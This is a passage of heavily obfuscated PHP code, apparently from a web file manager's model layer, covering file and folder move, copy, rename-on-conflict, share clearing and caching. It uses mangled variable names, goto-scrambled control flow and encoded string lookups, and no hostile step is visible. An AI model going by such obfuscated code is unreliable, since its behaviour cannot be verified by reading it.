$f¥¸¶ŒîÔ[538] => $Aò÷»íŒÔ³[$f¥¸¶ŒîÔ[389]], $f¥¸¶ŒîÔ[539] => $Aò÷»íŒÔ³[$f¥¸¶ŒîÔ[474]], $f¥¸¶ŒîÔ[540] => USER_ID, $f¥¸¶ŒîÔ[541] => USER_ID, $f¥¸¶ŒîÔ[386] => $Aò÷»íŒÔ³[$f¥¸¶ŒîÔ[387]], $f¥¸¶ŒîÔ[542] => $Aò÷»íŒÔ³[$f¥¸¶ŒîÔ[477]] . $Aò÷»íŒÔ³[$f¥¸¶ŒîÔ[387]] . $f¥¸¶ŒîÔ[47], $f¥¸¶ŒîÔ[413] => 0, $f¥¸¶ŒîÔ[543] => $f¥¸¶ŒîÔ[33]); return $dø¯º·í…²; } private function _copyApplyMeta($e´°ÍÎõÒ¯, &$dÂÈëÔµ¼) { $A¡çøÇª¡ =& $_SERVER[Æ¼ôºÙï]; $CŸÇç¿—Ï‚ = $e´°ÍÎõÒ¯[$A¡çøÇª¡[387]]; $cãäÖ¥•á = $e´°ÍÎõÒ¯[$A¡çøÇª¡[28]]; if (!isset($e´°ÍÎõÒ¯[$A¡çøÇª¡[544]]) || !$e´°ÍÎõÒ¯[$A¡çøÇª¡[544]] || $e´°ÍÎõÒ¯[$A¡çøÇª¡[544]] == $A¡çøÇª¡[486]) { $dÂÈëÔµ¼[$A¡çøÇª¡[520]][] = array($A¡çøÇª¡[387], $CŸÇç¿—Ï‚, $A¡çøÇª¡[544], short_id($CŸÇç¿—Ï‚)); } if (Input::check($cãäÖ¥•á, $A¡çøÇª¡[545])) { $dÂÈëÔµ¼[$A¡çøÇª¡[519]][] = array($A¡çøÇª¡[387] => $CŸÇç¿—Ï‚, $A¡çøÇª¡[92] => $A¡çøÇª¡[433], $A¡çøÇª¡[368] => str_replace($A¡çøÇª¡[50], $A¡çøÇª¡[33], Pinyin::encode($cãäÖ¥•á))); $dÂÈëÔµ¼[$A¡çøÇª¡[519]][] = array($A¡çøÇª¡[387] => $CŸÇç¿—Ï‚, $A¡çøÇª¡[92] => $A¡çøÇª¡[432], $A¡çøÇª¡[368] => Pinyin::encode($cãäÖ¥•á, $A¡çøÇª¡[546])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($D°ÓÓµ§¶á) { goto D§Ù…®Œ; aï©ˆŒ½¢Î: $bö³¾¯øÑÍ = array($AÍ¨ÆÇŠÇ§[477] => array($AÍ¨ÆÇŠÇ§[501], $B¾¡Î´âÜ¹[$AÍ¨ÆÇŠÇ§[477]] . $D°ÓÓµ§¶á . $AÍ¨ÆÇŠÇ§[502]), $AÍ¨ÆÇŠÇ§[414] => $this->targetIsDelete); $B¼Óœ »ô = $this->field($FÒÁã¸«»)->where($bö³¾¯øÑÍ)->select(); if (!$B¼Óœ »ô) { return; } goto Cº¨½²¦Ñ¾; Cº¨½²¦Ñ¾: $B¼Óœ »ô = array_to_keyvalue($B¼Óœ »ô, $AÍ¨ÆÇŠÇ§[387]); foreach ($B¼Óœ »ô as $B¥Ù÷„©šˆ) { $E›Ñùö‰¾ = $B¥Ù÷„©šˆ[$AÍ¨ÆÇŠÇ§[479]]; $D°ÓÓµ§¶á = $B¥Ù÷„©šˆ[$AÍ¨ÆÇŠÇ§[387]]; if (!isset($this->_childrenListCache[$D°ÓÓµ§¶á]) && $B¥Ù÷„©šˆ[$AÍ¨ÆÇŠÇ§[388]] == $AÍ¨ÆÇŠÇ§[86]) { $this->_childrenListCache[$D°ÓÓµ§¶á] = array(); } if (!isset($this->_childrenListCache[$E›Ñùö‰¾])) { $this->_childrenListCache[$E›Ñùö‰¾] = array(); } $this->_childrenListCache[$E›Ñùö‰¾][$D°ÓÓµ§¶á] = $B¥Ù÷„©šˆ; $this->_childrenItemCache[$D°ÓÓµ§¶á] = $B¥Ù÷„©šˆ; } goto Dª÷ÀŞ´‚À; D§Ù…®Œ: $AÍ¨ÆÇŠÇ§ =& $_SERVER[Æ¼ôºÙï]; $B¾¡Î´âÜ¹ = $this->sourceInfo($D°ÓÓµ§¶á); $FÒÁã¸«» = $AÍ¨ÆÇŠÇ§[415]; goto aï©ˆŒ½¢Î; Dª÷ÀŞ´‚À: } private function _childrenListAll($F÷ô¡ùŞÄ, &$bµ¶ğˆ‘«ù) { $aÀ¹¹•Î«á =& $_SERVER[Æ¼ôºÙï]; if (!isset($this->_childrenListCache[$F÷ô¡ùŞÄ])) { return; } $e¼‹ñÎœğ½ = $this->_childrenListCache[$F÷ô¡ùŞÄ]; foreach ($e¼‹ñÎœğ½ as $Eˆ¦ÍÅÃ±‹ => $AÄšÄ½×©) { $bµ¶ğˆ‘«ù[$Eˆ¦ÍÅÃ±‹] = $AÄšÄ½×©; if ($AÄšÄ½×©[$aÀ¹¹•Î«á[388]] == $aÀ¹¹•Î«á[86]) { $this->_childrenListAll($Eˆ¦ÍÅÃ±‹, $bµ¶ğˆ‘«ù); } } } private function sourceInfoCache($aë¼Ò—Ë¤) { if (isset($this->_childrenItemCache[$aë¼Ò—Ë¤])) { return $this->_childrenItemCache[$aë¼Ò—Ë¤]; } return $this->sourceInfo($aë¼Ò—Ë¤); } private function _childrenList($C¹”Úçèò„) { if (isset($this->_childrenListCache[$C¹”Úçèò„])) { return $this->_childrenListCache[$C¹”Úçèò„]; } return $this->_childrenListSelect($C¹”Úçèò„); } private function _childrenListSelect($e“” áÑÕ²) { goto A²ŠÛ½±ƒ«; f’ºÚİòî§: foreach ($dµßÈ‹ƒöÌ as $e“” áÑÕ² => $cŠÍ˜¤ô¼Ã) { $this->_childrenItemCache[$e“” áÑÕ²] = $cŠÍ˜¤ô¼Ã; } return $dµßÈ‹ƒöÌ; goto aé¿³§¶‚; A²ŠÛ½±ƒ«: $A§ÓØ¶ô¦ =& $_SERVER[Æ¼ôºÙï]; $fà¸ÜÍ–§õ = array($A§ÓØ¶ô¦[479] => $e“” áÑÕ², $A§ÓØ¶ô¦[414] => $this->targetIsDelete); $C§ˆµ·Ãè = $this->where($fà¸ÜÍ–§õ)->select(); goto BîğŠ¾ÚĞì; BîğŠ¾ÚĞì: $C§ˆµ·Ãè = $C§ˆµ·Ãè ? $C§ˆµ·Ãè : array(); $dµßÈ‹ƒöÌ = array_to_keyvalue($C§ˆµ·Ãè, $A§ÓØ¶ô¦[387]); $this->_childrenListCache[$e“” áÑÕ²] = $dµßÈ‹ƒöÌ; goto f’ºÚİòî§; aé¿³§¶‚: } private function fileNameExistCache($cã¢Ù‹‰, $EÙ²âØ ) { $AæœùÈáŞ– =& $_SERVER[Æ¼ôºÙï]; $EÙ²âØ  = strtolower($EÙ²âØ ); $D–İ­ê¦Ú = $this->_childrenList($cã¢Ù‹‰); foreach ($D–İ­ê¦Ú as $F¹ˆ„ˆÑ¡) { if ($EÙ²âØ  == strtolower($F¹ˆ„ˆÑ¡[$AæœùÈáŞ–[28]])) { return $F¹ˆ„ˆÑ¡[$AæœùÈáŞ–[387]]; } } return !1; } private function fileNameAutoCache($AœÒ¸…«åï, $dºÀõÕÍÊ“, $BĞÃ†±¨, $E™Õ‚Å°·Ë) { $C’¼Ğ••Ë =& $_SERVER[Æ¼ôºÙï]; $cÀ™–õ¥„¦ = $this->_childrenList($AœÒ¸…«åï); $bÀñÊ˜”ã¼ = array_to_keyvalue($cÀ™–õ¥„¦, $C’¼Ğ••Ë[33], $C’¼Ğ••Ë[28]); return $this->fileNameAutoGet($bÀñÊ˜”ã¼, $dºÀõÕÍÊ“, $BĞÃ†±¨, $E™Õ‚Å°·Ë); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($E¶ÇØâŒ™É, $c»œÛÇŞ¢Â, $E¡¥…†Û‘ = REPEAT_REPLACE, $D›ÄÈã„Ò¯ = '') { goto A°’ÖØ¼º½; C’¢Ş½¼è¤: $this->lockMoveEnd($E¶ÇØâŒ™É); $this->lockWriteEnd($c»œÛÇŞ¢Â, $BßÖñ‡ëõ); $this->folderSizeReset($FÊì“‘ŠŠµ[$c•äÙ¨éİ¹[479]]); goto c…ñæõŸÈˆ; B¹ï“¨õĞ£: $this->updateModifyTime($Aáë´¢–©); Model($c•äÙ¨éİ¹[522])->eventMove($E¶ÇØâŒ™É, $FÊì“‘ŠŠµ[$c•äÙ¨éİ¹[479]], $c»œÛÇŞ¢Â); Hook::trigger($c•äÙ¨éİ¹[548], $f“®¶¿è¬¤); goto F²ŠÆ½¹øÍ; AØî®©Â¾¼: if (!$FÊì“‘ŠŠµ || !$bØÛ©äåƒ» || $bØÛ©äåƒ»[$c•äÙ¨éİ¹[388]] != $c•äÙ¨éİ¹[86]) { return !1; } Hook::trigger($c•äÙ¨éİ¹[547], $f“®¶¿è¬¤); $this->targetIsDelete = intval($FÊì“‘ŠŠµ[$c•äÙ¨éİ¹[414]]); goto FÌ±ëÓ‹……; bÚÄøÑäò¸: $B¬·İ¯Å–¹ = $this->fileNameExistCache($c»œÛÇŞ¢Â, $FÊì“‘ŠŠµ[$c•äÙ¨éİ¹[28]]); $e¡Ÿó½ÀìÑ = $this->_move($E¶ÇØâŒ™É, $c»œÛÇŞ¢Â, $E¡¥…†Û‘, $d‹õÛ›±à”, $D›ÄÈã„Ò¯); $this->sourceCacheClear(); goto BË´ÔÂ¤›Ó; c…ñæõŸÈˆ: $this->folderSizeReset($c»œÛÇŞ¢Â); $Aáë´¢–© = array($FÊì“‘ŠŠµ[$c•äÙ¨éİ¹[479]], $c»œÛÇŞ¢Â); if ($FÊì“‘ŠŠµ[$c•äÙ¨éİ¹[388]] == $c•äÙ¨éİ¹[86]) { $Aáë´¢–©[] = $E¶ÇØâŒ™É; } goto B¹ï“¨õĞ£; BË´ÔÂ¤›Ó: if ($FÊì“‘ŠŠµ[$c•äÙ¨éİ¹[388]] == $c•äÙ¨éİ¹[86] && $B¬·İ¯Å–¹) { $this->folderSizeResetChildren($e¡Ÿó½ÀìÑ); } Model($c•äÙ¨éİ¹[173])->linkAdd($d‹õÛ›±à”[$c•äÙ¨éİ¹[518]]); if ($B¬·İ¯Å–¹ && $d‹õÛ›±à”[$c•äÙ¨éİ¹[549]]) { $this->removeNow($E¶ÇØâŒ™É, !1); } goto C’¢Ş½¼è¤; B¯ê–É‰ñ‡: if ($FÊì“‘ŠŠµ[$c•äÙ¨éİ¹[479]] == $bØÛ©äåƒ»[$c•äÙ¨éİ¹[387]]) { if ($FÊì“‘ŠŠµ[$c•äÙ¨éİ¹[414]] == $c•äÙ¨éİ¹[86]) { Model($c•äÙ¨éİ¹[412])->restore(array($E¶ÇØâŒ™É)); } if (!$D›ÄÈã„Ò¯ || $D›ÄÈã„Ò¯ == $FÊì“‘ŠŠµ[$c•äÙ¨éİ¹[28]]) { return $E¶ÇØâŒ™É; } } $f“®¶¿è¬¤ = $this->pathInfoMore($E¶ÇØâŒ™É); if ($this->isParentOf($E¶ÇØâŒ™É, $c»œÛÇŞ¢Â)) { return !1; } goto AØî®©Â¾¼; Bæ´˜ğä¯ª: $this->lockWriteStart($c»œÛÇŞ¢Â, $BßÖñ‡ëõ); $d‹õÛ›±à” = array($c•äÙ¨éİ¹[518] => array(), $c•äÙ¨éİ¹[549] => !1); $this->clearShare($E¶ÇØâŒ™É, $c»œÛÇŞ¢Â); goto bÚÄøÑäò¸; A°’ÖØ¼º½: $c•äÙ¨éİ¹ =& $_SERVER[Æ¼ôºÙï]; $FÊì“‘ŠŠµ = $this->sourceInfo($E¶ÇØâŒ™É); $bØÛ©äåƒ» = $this->sourceInfo($c»œÛÇŞ¢Â); goto B¯ê–É‰ñ‡; F²ŠÆ½¹øÍ: return $e¡Ÿó½ÀìÑ; goto a×ç¦ŠòŠ¯; FÌ±ëÓ‹……: if ($FÊì“‘ŠŠµ[$c•äÙ¨éİ¹[479]] == $c»œÛÇŞ¢Â && $D›ÄÈã„Ò¯ != $FÊì“‘ŠŠµ[$c•äÙ¨éİ¹[28]]) { $AÔĞ£Ü‡Ÿ = $this->fileNameExist($c»œÛÇŞ¢Â, $D›ÄÈã„Ò¯); if ($AÔĞ£Ü‡Ÿ && $FÊì“‘ŠŠµ[$c•äÙ¨éİ¹[388]] == $c•äÙ¨éİ¹[486]) { goto A·Ã‘ÉÆŒ†; A·Ã‘ÉÆŒ†: $E¾‰ÁŞ±ÆÒ = $this->sourceInfo($AÔĞ£Ü‡Ÿ); $a±°†ƒ‚Ãá = $this->fileHistory($E¾‰ÁŞ±ÆÒ, $FÊì“‘ŠŠµ[$c•äÙ¨éİ¹[436]], $FÊì“‘ŠŠµ[$c•äÙ¨éİ¹[77]]); if (!$a±°†ƒ‚Ãá) { Model($c•äÙ¨éİ¹[439])->remove($FÊì“‘ŠŠµ[$c•äÙ¨éİ¹[436]]); } goto F§Èºâğ„; F§Èºâğ„: $this->removeNow($E¶ÇØâŒ™É, !1); $this->folderSizeReset($c»œÛÇŞ¢Â); Hook::trigger($c•äÙ¨éİ¹[548], $f“®¶¿è¬¤); goto Cêàá¼İ±´; Cêàá¼İ±´: return $AÔĞ£Ü‡Ÿ; goto F·’“·öÑˆ; F·’“·öÑˆ: } } $BßÖñ‡ëõ = $D›ÄÈã„Ò¯ ? $D›ÄÈã„Ò¯ : $FÊì“‘ŠŠµ[$c•äÙ¨éİ¹[28]]; $this->lockMoveStart($E¶ÇØâŒ™É); goto Bæ´˜ğä¯ª; a×ç¦ŠòŠ¯: } private function _move($e ÈÔŠÒ©§, $F¨³­÷ª«Õ, $d¾š˜øî•, &$b…Š¥Ò–é—, $BÚ¾²³‡‹‹ = '') { goto dÑÃ¥ø‡Ÿ; DĞí„š»ª¸: $D¯›‰•ÃÁ± = !1; if ($B£ÍÃÙùŠÇ) { if ($d¾š˜øî• == REPEAT_RENAME_FOLDER) { $fÆã°‘‹Š = $this->fileNameAuto($F¨³­÷ª«Õ, $fÆã°‘‹Š, $d¾š˜øî•, $B£ÍÃÙùŠÇ); $d¢íˆÆŠ…á = $this->_moveForce($e ÈÔŠÒ©§, $F¨³­÷ª«Õ, $fÆã°‘‹Š); } else { if ($d¾š˜øî• == REPEAT_RENAME_FOLDER) { $d¾š˜øî• = REPEAT_RENAME; } $DòÅ¾ÆŞÙ = $this->_childrenListSelect($e ÈÔŠÒ©§); foreach ($DòÅ¾ÆŞÙ as $A£Èéì›—) { $this->_move($A£Èéì›—[$bÖ‡²÷Ùøù[387]], $e’Œ¸áÄ, $d¾š˜øî•, $b…Š¥Ò–é—); } $D¯›‰•ÃÁ± = !0; } } else { if ($d¾š˜øî• == REPEAT_SKIP) { $D¯›‰•ÃÁ± = !0; } else { if ($d¾š˜øî• == REPEAT_RENAME || $d¾š˜øî• == REPEAT_RENAME_FOLDER) { $fÆã°‘‹Š = $this->fileNameAuto($F¨³­÷ª«Õ, $fÆã°‘‹Š, $d¾š˜øî•, $B£ÍÃÙùŠÇ); $d¢íˆÆŠ…á = $this->_moveForce($e ÈÔŠÒ©§, $F¨³­÷ª«Õ, $fÆã°‘‹Š); } else { if ($d¾š˜øî• == REPEAT_REPLACE) { $Eäê»´´ñ = $this->sourceInfoCache($e’Œ¸áÄ); $d¤ë˜ó¢¯­ = $this->fileHistory($Eäê»´´ñ, $fÈ„Ş¨¢Ş·[$bÖ‡²÷Ùøù[436]], $fÈ„Ş¨¢Ş·[$bÖ‡²÷Ùøù[77]]); if ($d¤ë˜ó¢¯­) { $b…Š¥Ò–é—[$bÖ‡²÷Ùøù[518]][] = $fÈ„Ş¨¢Ş·[$bÖ‡²÷Ùøù[436]]; } else { $D¯›‰•ÃÁ± = !0; } } } } } if ($D¯›‰•ÃÁ± && !$b…Š¥Ò–é—[$bÖ‡²÷Ùøù[549]]) { $b…Š¥Ò–é—[$bÖ‡²÷Ùøù[549]] = !0; } goto e»¨áŠ¬×Ş; e»¨áŠ¬×Ş: return $d¢íˆÆŠ…á; goto Bçì¿ÀÌ—; aä ¬ö¡: $this->lockWriteStart($F¨³­÷ª«Õ, $fÆã°‘‹Š); if (!$e’Œ¸áÄ) { return $this->_moveForce($e ÈÔŠÒ©§, $F¨³­÷ª«Õ, $fÆã°‘‹Š); } $d¢íˆÆŠ…á = $e’Œ¸áÄ; goto DĞí„š»ª¸; dÑÃ¥ø‡Ÿ: $bÖ‡²÷Ùøù =& $_SERVER[Æ¼ôºÙï]; $fÈ„Ş¨¢Ş· = $this->sourceInfo($e ÈÔŠÒ©§); $B£ÍÃÙùŠÇ = $fÈ„Ş¨¢Ş·[$bÖ‡²÷Ùøù[388]] == $bÖ‡²÷Ùøù[86]; goto EÎïÁ‘•ğó; EÎïÁ‘•ğó: $fÆã°‘‹Š = $BÚ¾²³‡‹‹ ? $BÚ¾²³‡‹‹ : $fÈ„Ş¨¢Ş·[$bÖ‡²÷Ùøù[28]]; $e’Œ¸áÄ = $this->fileNameExistCache($F¨³­÷ª«Õ, $fÆã°‘‹Š); $this->lockMoveStart($e ÈÔŠÒ©§); goto aä ¬ö¡; Bçì¿ÀÌ—: } private function _moveForce($FØ´ã‘£õ, $A–Ì…Û°´, $C¤ò«á£ÚÂ) { goto f­Íí·Û¤; EÀ¾’Û—˜ˆ: if (!$dÚ‰¹ôéá÷) { Model($a½ƒç—Äæ²[472])->authClear($FØ´ã‘£õ); } $D»ÖêÂ×”À = $e­æÁ¦ù³[$a½ƒç—Äæ²[414]] == $a½ƒç—Äæ²[86] && $e¼¶É°ˆæ[$a½ƒç—Äæ²[414]] != $a½ƒç—Äæ²[86]; if ($D»ÖêÂ×”À) { $b¼Ëš÷Ú÷Ÿ[$a½ƒç—Äæ²[413]] = 0; } goto aÓ‡”õ“‘Ë; B‚†Œ¯Ô¾: $a°–ÏÌĞÕÛ = $e­æÁ¦ù³[$a½ƒç—Äæ²[388]] == $a½ƒç—Äæ²[86]; $b¼Ëš÷Ú÷Ÿ = array($a½ƒç—Äæ²[386] => $e¼¶É°ˆæ[$a½ƒç—Äæ²[387]], $a½ƒç—Äæ²[542] => $e¼¶É°ˆæ[$a½ƒç—Äæ²[477]] . $e¼¶É°ˆæ[$a½ƒç—Äæ²[387]] . $a½ƒç—Äæ²[47], $a½ƒç—Äæ²[538] => $e¼¶É°ˆæ[$a½ƒç—Äæ²[389]], $a½ƒç—Äæ²[539] => $e¼¶É°ˆæ[$a½ƒç—Äæ²[474]], $a½ƒç—Äæ²[541] => USER_ID, $a½ƒç—Äæ²[404] => $C¤ò«á£ÚÂ); $dÚ‰¹ôéá÷ = $e­æÁ¦ù³[$a½ƒç—Äæ²[389]] == SourceModel::TYPE_GROUP && $e¼¶É°ˆæ[$a½ƒç—Äæ²[389]] == SourceModel::TYPE_GROUP && $e­æÁ¦ù³[$a½ƒç—Äæ²[474]] == $e¼¶É°ˆæ[$a½ƒç—Äæ²[474]]; goto EÀ¾’Û—˜ˆ; aÓ‡”õ“‘Ë: if ($a°–ÏÌĞÕÛ) { $eÁœ´µš‹Ó = array($a½ƒç—Äæ²[542] => array($a½ƒç—Äæ²[501], $e­æÁ¦ù³[$a½ƒç—Äæ²[477]] . $e­æÁ¦ù³[$a½ƒç—Äæ²[387]] . $a½ƒç—Äæ²[502])); $a‹Á•Ğô…ù = $e­æÁ¦ù³[$a½ƒç—Äæ²[477]] . $e­æÁ¦ù³[$a½ƒç—Äæ²[387]] . $a½ƒç—Äæ²[47]; $D¶¢´­‚œ = $e¼¶É°ˆæ[$a½ƒç—Äæ²[477]] . $e¼¶É°ˆæ[$a½ƒç—Äæ²[387]] . $a½ƒç—Äæ²[47] . $e­æÁ¦ù³[$a½ƒç—Äæ²[387]] . $a½ƒç—Äæ²[47]; $a”ªÒ×ÔÑ‰ = array($a½ƒç—Äæ²[542] => array($a½ƒç—Äæ²[550], "\162\145\x70\x6c\141\x63\145\50\160\x61\x72\145\156\164\x4c\x65\x76\x65\154\54\x27{$a‹Á•Ğô…ù}\47\x2c\47{$D¶¢´­‚œ}\x27\x29"), $a½ƒç—Äæ²[538] => $e¼¶É°ˆæ[$a½ƒç—Äæ²[389]], $a½ƒç—Äæ²[539] => $e¼¶É°ˆæ[$a½ƒç—Äæ²[474]]); if ($D»ÖêÂ×”À) { $a”ªÒ×ÔÑ‰[$a½ƒç—Äæ²[413]] = 0; } $this->where($eÁœ´µš‹Ó)->data($a”ªÒ×ÔÑ‰)->save(); } $this->where(array($a½ƒç—Äæ²[401] => $FØ´ã‘£õ))->data($b¼Ëš÷Ú÷Ÿ)->save(); return $FØ´ã‘£õ; goto ağ¨ÓšÄÍÏ; f­Íí·Û¤: $a½ƒç—Äæ² =& $_SERVER[Æ¼ôºÙï]; $e­æÁ¦ù³ = $this->sourceInfo($FØ´ã‘£õ); $e¼¶É°ˆæ = $this->sourceInfo($A–Ì…Û°´); goto B‚†Œ¯Ô¾; ağ¨ÓšÄÍÏ: } private function clearShare($b‰ ìœˆ¯ˆ, $F‹¦õ‚ÆéÏ) { goto A‹’‚êÜÀË; Fß¾Ìê×âŒ: if (!$a‰¢ëİÓ´) { return; } $cĞ Úâ”” = array($AÆø˜ìó¶ª[387] => array($AÆø˜ìó¶ª[7], $a‰¢ëİÓ´), $AÆø˜ìó¶ª[464] => 1); $D½îàĞë¸Æ = Model($AÆø˜ìó¶ª[552])->field($AÆø˜ìó¶ª[457])->where($cĞ Úâ””)->select(); goto a‹ğ…ùÖ‹ƒ; F´ñëÔ‡×: if ($Aµİ©ËÉŒ[$AÆø˜ìó¶ª[474]] == $C¾ô›…ìƒ[$AÆø˜ìó¶ª[474]] && $Aµİ©ËÉŒ[$AÆø˜ìó¶ª[389]] == $AÆø˜ìó¶ª[551]) { return; } $cĞ Úâ”” = array($AÆø˜ìó¶ª[477] => array($AÆø˜ìó¶ª[501], $Aµİ©ËÉŒ[$AÆø˜ìó¶ª[477]] . $b‰ ìœˆ¯ˆ . $AÆø˜ìó¶ª[502])); $a‰¢ëİÓ´ = $this->field($AÆø˜ìó¶ª[401])->where($cĞ Úâ””)->getField($AÆø˜ìó¶ª[387], !0); goto Fß¾Ìê×âŒ; a‹ğ…ùÖ‹ƒ: if (!$D½îàĞë¸Æ) { return; } $D½îàĞë¸Æ = array_to_keyvalue($D½îàĞë¸Æ, $AÆø˜ìó¶ª[33], $AÆø˜ìó¶ª[457]); $cĞ Úâ”” = array($AÆø˜ìó¶ª[457] => array($AÆø˜ìó¶ª[7], $D½îàĞë¸Æ)); goto C›èš»ˆõ; A‹’‚êÜÀË: $AÆø˜ìó¶ª =& $_SERVER[Æ¼ôºÙï]; $Aµİ©ËÉŒ = $this->sourceInfo($b‰ ìœˆ¯ˆ); $C¾ô›…ìƒ = $this->sourceInfo($F‹¦õ‚ÆéÏ); goto F´ñëÔ‡×; C›èš»ˆõ: Model($AÆø˜ìó¶ª[552])->where($cĞ Úâ””)->save(array($AÆø˜ìó¶ª[464] => 0)); Model($AÆø˜ìó¶ª[553])->where($cĞ Úâ””)->delete(); goto d’ÖŒÇÖË; d’ÖŒÇÖË: } public function copyFolderFromIO($aùĞŠ§êá, $FÒ¼ÍÂ†Õ, $b÷Î„¡¯óç, $a»Ó—÷õÌâ, $e¿‘“š…Ñ¾, $E…ìöÃ±Ú° = false) { goto e£¥‘¨ä°¿; F…–êÀ‘Ø”: $FÒ°ØË…îè = $this->fileNameExist($b÷Î„¡¯óç, $bæ£ÎÛ„ç); $C©ãÌäèõÁ = $this->mkdir($b÷Î„¡¯óç, $bæ£ÎÛ„ç, $a»Ó—÷õÌâ); if (!$FÒ°ØË…îè || $a»Ó—÷õÌâ == REPEAT_RENAME_FOLDER) { $a»Ó—÷õÌâ = !1; } goto AøëÑ¼†‰; d‘›˜Ñä÷: Model($cÊâ¡ãÆ™õ[439])->linkAdd($e¬•¬ÏÊ¹[$cÊâ¡ãÆ™õ[518]]); Model($cÊâ¡ãÆ™õ[439])->remove($e¬•¬ÏÊ¹[$cÊâ¡ãÆ™õ[554]]); $this->folderSizeReset($b÷Î„¡¯óç); goto C¹î×ÒÕ…¡; BÜÍ¿ïõ¼ : Model($cÊâ¡ãÆ™õ[521])->addAll($e¬•¬ÏÊ¹[$cÊâ¡ãÆ™õ[519]], array(), !0); Model($cÊâ¡ãÆ™õ[522])->eventCopy($C©ãÌäèõÁ); $this->saveAll($e¬•¬ÏÊ¹[$cÊâ¡ãÆ™õ[520]]); goto d‘›˜Ñä÷; FöÑÚ†²»Ÿ: Hook::trigger($cÊâ¡ãÆ™õ[556]); if ($C©ãÌäèõÁ) { $this->folderSizeResetChildren($C©ãÌäèõÁ); } $this->_childrenListClear(); goto BÜÍ¿ïõ¼ ; e£¥‘¨ä°¿: $cÊâ¡ãÆ™õ =& $_SERVER[Æ¼ôºÙï]; $e¬•¬ÏÊ¹ = array($cÊâ¡ãÆ™õ[519] => array(), $cÊâ¡ãÆ™õ[520] => array(), $cÊâ¡ãÆ™õ[518] => array(), $cÊâ¡ãÆ™õ[554] => array()); $bæ£ÎÛ„ç = $E…ìöÃ±Ú° ? $E…ìöÃ±Ú° : $aùĞŠ§êá->pathThis($FÒ¼ÍÂ†Õ); goto F…–êÀ‘Ø”; C¹î×ÒÕ…¡: $this->updateModifyTime($b÷Î„¡¯óç); return $C©ãÌäèõÁ; goto dÜÆ—¤ï; AøëÑ¼†‰: if ($FÒ°ØË…îè) { $this->_childrenAllMake($FÒ°ØË…îè); } Hook::trigger($cÊâ¡ãÆ™õ[555]); $this->_copyChildTo($aùĞŠ§êá, $FÒ¼ÍÂ†Õ, $C©ãÌäèõÁ, $a»Ó—÷õÌâ, $e¬•¬ÏÊ¹, $e¿‘“š…Ñ¾); goto FöÑÚ†²»Ÿ; dÜÆ—¤ï: } private function _copyChildTo($EŞğŸ³¿…, $d¶ø—§°, $B„ŸŸàäÓ, $FÃ¥îŸ”¯®, &$Cá„…†„ã, $a¸„Û†ˆÏ´) { goto bƒË…ÃÔÏ; bƒË…ÃÔÏ: $Aìªæ‚‘ß™ =& $_SERVER[Æ¼ôºÙï]; $A‚ùª¢ÏÏ = $this->sourceInfoCache($B„ŸŸàäÓ); $D—ºø‹èŒŠ = $EŞğŸ³¿…->listPath($d¶ø—§°); goto d‡†”ßƒ‰; aØ´”É™›¥: $c³—¹…–Œ = $this->_childrenList($B„ŸŸàäÓ); $c³—¹…–Œ = array_to_keyvalue($c³—¹…–Œ, $Aìªæ‚‘ß™[28]); foreach ($Dôà›ä” as $CÄÈ÷ƒÌäÍ) { $DÑ¦˜òäœ = $c³—¹…–Œ[$CÄÈ÷ƒÌäÍ[$Aìªæ‚‘ß™[28]]]; $fÀÑÚ¯¹¦ = $DÑ¦˜òäœ[$Aìªæ‚‘ß™[387]]; $this->_copyApplyMeta($DÑ¦˜òäœ, $Cá„…†„ã); if ($CÄÈ÷ƒÌäÍ[$Aìªæ‚‘ß™[29]] == $Aìªæ‚‘ß™[76]) { $CÄÈ÷ƒÌäÍ[$Aìªæ‚‘ß™[75]] = $EŞğŸ³¿…->getPathInner($CÄÈ÷ƒÌäÍ[$Aìªæ‚‘ß™[75]]); $this->_copyChildTo($EŞğŸ³¿…, $CÄÈ÷ƒÌäÍ[$Aìªæ‚‘ß™[75]], $fÀÑÚ¯¹¦, $FÃ¥îŸ”¯®, $Cá„…†„ã, $a¸„Û†ˆÏ´); } } goto F…´«Ç™ç; d‡†”ßƒ‰: $Dôà›ä” = array_merge($D—ºø‹èŒŠ[$Aìªæ‚‘ß™[73]], $D—ºø‹èŒŠ[$Aìªæ‚‘ß™[74]]); $CÜ£õÍÅ¤™ = $this->_addFiles($EŞğŸ³¿…, $D—ºø‹èŒŠ[$Aìªæ‚‘ß™[73]], $a¸„Û†ˆÏ´); $DÈ¢·”‹ŒÉ = array(); goto FÎ§îµèÖ¤; FÎ§îµèÖ¤: foreach ($Dôà›ä” as &$CÄÈ÷ƒÌäÍ) { goto dÆÉÂ©‘¸; dÜ•»¢÷Ğ: $CÄÈ÷ƒÌäÍ[$Aìªæ‚‘ß™[77]] = _get($CÄÈ÷ƒÌäÍ, $Aìªæ‚‘ß™[77], 0); $CÄÈ÷ƒÌäÍ[$Aìªæ‚‘ß™[436]] = _get($CÄÈ÷ƒÌäÍ, $Aìªæ‚‘ß™[436], 0); if (!isset($CÄÈ÷ƒÌäÍ[$Aìªæ‚‘ß™[557]]) && $CÄÈ÷ƒÌäÍ[$Aìªæ‚‘ß™[436]]) { $Cá„…†„ã[$Aìªæ‚‘ß™[554]][] = $CÄÈ÷ƒÌäÍ[$Aìªæ‚‘ß™[436]]; } goto a¶ëÉšÇâĞ; a¶ëÉšÇâĞ: if ($FÃ¥îŸ”¯®) { $aá³ˆÉ¹Ôó = $this->fileNameExistCache($B„ŸŸàäÓ, $CÄÈ÷ƒÌäÍ[$Aìªæ‚‘ß™[28]]); if ($aá³ˆÉ¹Ôó) { if ($CÄÈ÷ƒÌäÍ[$Aìªæ‚‘ß™[388]] || $FÃ¥îŸ”¯® == REPEAT_SKIP) { continue; } if ($FÃ¥îŸ”¯® == REPEAT_REPLACE) { $DÑ¦˜òäœ = $this->sourceInfoCache($aá³ˆÉ¹Ôó); $E£½‡äÚî» = $this->fileHistory($DÑ¦˜òäœ, $CÄÈ÷ƒÌäÍ[$Aìªæ‚‘ß™[436]], $CÄÈ÷ƒÌäÍ[$Aìªæ‚‘ß™[77]]); if ($E£½‡äÚî») { $Cá„…†„ã[$Aìªæ‚‘ß™[518]][] = $CÄÈ÷ƒÌäÍ[$Aìªæ‚‘ß™[436]]; } continue; } else { if ($FÃ¥îŸ”¯® == REPEAT_RENAME) { $CÄÈ÷ƒÌäÍ[$Aìªæ‚‘ß™[28]] = $this->fileNameAutoCache($B„ŸŸàäÓ, $CÄÈ÷ƒÌäÍ[$Aìªæ‚‘ß™[28]], 